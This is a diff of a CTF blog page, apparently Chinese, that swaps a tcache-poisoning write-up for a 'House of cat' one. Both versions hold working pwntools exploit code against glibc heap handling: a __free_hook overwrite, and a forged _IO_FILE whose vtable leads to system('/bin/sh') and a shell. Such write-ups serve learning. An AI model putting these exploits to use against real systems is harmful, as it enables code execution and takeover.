-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span>
-		   <span class="hljs-string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>), b, target);
-	<span class="hljs-comment">// VULNERABILITY</span>
-	<span class="hljs-comment">// the following operation assumes the address of b is known, which requires a heap leak</span>
-	b[<span class="hljs-number">0</span>] = (<span class="hljs-type">intptr_t</span>)((<span class="hljs-type">long</span>)target ^ (<span class="hljs-type">long</span>)b &gt;&gt; <span class="hljs-number">12</span>);
-	<span class="hljs-comment">// VULNERABILITY</span>
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, target);
-
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>));
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, target);
-
-	<span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2nd malloc(128): %p\n&quot;</span>, c);
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We got the control\n&quot;</span>);
-
-	assert((<span class="hljs-type">long</span>)target == (<span class="hljs-type">long</span>)c);
-	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-&#125;</code></pre>
-<p>相应exp</p>
-<pre><code class="hljs python">add(<span class="hljs-number">10</span>,<span class="hljs-number">0x900</span>)
-add(<span class="hljs-number">11</span>,<span class="hljs-number">0x900</span>)
-delete(<span class="hljs-number">10</span>)
-delete(<span class="hljs-number">11</span>)
 <span class="hljs-comment"># pause()</span>
-xor_free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] ^ ((heap_base + <span class="hljs-number">0x3290</span>)&gt;&gt; <span class="hljs-number">12</span>)
-edit(<span class="hljs-number">11</span>,p64(xor_free_hook))
-add(<span class="hljs-number">13</span>,<span class="hljs-number">0x900</span>)
-add(<span class="hljs-number">14</span>,<span class="hljs-number">0x900</span>)
-rop = ROP(libc)
+<span class="hljs-comment"># house_of_cat</span>
+fake_io_addr = libc.address - <span class="hljs-number">0x20003ff0</span> <span class="hljs-comment"># 伪造的fake_IO结构体的地址</span>
+show_addr(<span class="hljs-string">&#x27;fake_io_addr&#x27;</span>,fake_io_addr)
+next_chain = <span class="hljs-number">0</span>
 
-rop.system()
-info(rop.dump())
-edit(<span class="hljs-number">14</span>,rop.chain())
-edit(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
-show_addr(<span class="hljs-string">&#x27;__free_hook&#x27;</span>,libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])
+fake_IO_FILE=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>         <span class="hljs-comment">#0x0   _flags =&gt; rdi</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x8   _IO_read_ptr</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x10  _IO_read_end</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x18  _IO_read_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x20  _IO_write_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">1</span>)                <span class="hljs-comment">#0x28  _IO_write_ptr</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x30  _IO_write_end</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x38  _IO_buf_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x40  _IO_buf_end</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x48  _IO_save_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0x100</span>)            <span class="hljs-comment">#0x50  _IO_backup_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x58  _IO_save_end</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x60  _markers</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x68  _chain</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">4</span>             <span class="hljs-comment">#0x70  _fileno</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">4</span>             <span class="hljs-comment">#0x74  _flags2</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x78  _old_offset</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>           <span class="hljs-comment">#0x80  _cur_column</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00&#x27;</span>               <span class="hljs-comment">#0x82  _vtable_offset</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">5</span>             <span class="hljs-comment">#0x83  _shortbuf</span>
+fake_IO_FILE+=p64(fake_io_addr+<span class="hljs-number">0x1000</span>)                <span class="hljs-comment">#0x88  _lock</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x90  _offset</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x98  _codecvt</span>
+fake_IO_FILE+=p64(fake_io_addr+<span class="hljs-number">0x30</span>)<span class="hljs-comment">#0xa0  _wide_data       rax1 fake_io_addr+0x30</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0xa8  _freeres_list</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0xb0  _freeres_bufr</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0xb8  __pad5</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>   <span class="hljs-comment">#0xc0  _mode           rdx</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>+ p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> <span class="hljs-comment">#0xc4  _unused2</span>
+fake_IO_FILE+=p64(libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="hljs-number">0x30</span>)       <span class="hljs-comment">#0xd8  vtable</span>
+fake_IO_FILE+=p64(fake_io_addr+<span class="hljs-number">0x30</span>+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x40</span>).rjust(<span class="hljs-number">0x38</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)                             <span class="hljs-comment">#0xe0</span>
+fake_IO_FILE+=p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]).rjust(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)
+
+
 pause()
-delete(<span class="hljs-number">13</span>)
+
+r.sendafter(<span class="hljs-string">b&#x27;What do you think is appropriate to put into the gitf?\n&#x27;</span>,fake_IO_FILE)
 r.interactive()</code></pre>
-<p>拿到shell。学的有点上头。</p>
 
 
         <hr>
         <!-- Pager -->
         <ul class="pager">
           
-          <li class="previous">
-            <a href="/cn/Sagiring_markdown/Setcontext与Magic-Gadget/" data-toggle="tooltip" data-placement="top" title="Setcontext与Magic-Gadget">&larr; Previous Post</a>
-          </li>
-          
           
           <li class="next">
-            <a href="/cn/Sagiring_markdown/Heap利用与TLS-Canary覆盖/" data-toggle="tooltip" data-placement="top" title="Heap利用与TLS-Canary覆盖">Next Post &rarr;</a>
+            <a href="/cn/Sagiring_markdown/Setcontext与Magic-Gadget/" data-toggle="tooltip" data-placement="top" title="Setcontext与Magic-Gadget">Next Post &rarr;</a>
           </li>
           
         </ul>
@@ -726,7 +645,7 @@ r.interactive()</code></pre>
       </a>
     </li>
     <li class="social-share-li">
-      <a target="_blank" class="social-share-icon" href="mailto:?subject=LargebinsAttact与TcachebinsPosioning&body=Hi,I found this website and thought you might like it https://sagiring.github.io/cn/Sagiring_markdown/LargebinsAttact与TcachebinsPosioning/">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=House of cat&body=Hi,I found this website and thought you might like it https://sagiring.github.io/cn/Sagiring_markdown/House of cat/">
         <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
       </a>
     </li>
@@ -761,7 +680,7 @@ r.interactive()</code></pre>
       repo: 'Sagiring.github.io',
       owner: 'Sagiring',
       admin: 'Sagiring',
-      id: 'Thu Nov 02 2023 23:00:02 GMT+0800', // Ensure uniqueness and length less than 50
+      id: 'Tue Nov 14 2023 11:14:00 GMT+0800', // Ensure uniqueness and length less than 50
       distractionFreeMode: false, // Facebook-like distraction free mode
       perPage: 10,
       pagerDirection: 'last',
@@ -814,7 +733,7 @@ r.interactive()</code></pre>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#largebinsattact%E4%B8%8Etcachebinsposioning"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">LargebinsAttact与TcachebinsPosioning</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#section"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text"></span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">解题思路</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#house-of-cat"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">House of cat</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#glibc%E7%89%88%E6%9C%AC-2.36"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">glibc版本 2.36</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">程序逻辑</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">解题思路</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#io_file_plus%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">_IO_FILE_plus结构</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#house-of-cat-1"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">House of cat</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%A6%E5%A4%96"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">另外</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#exp"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">Exp</span></a></li></ol></li></ol>
         
         </div>
       </aside>
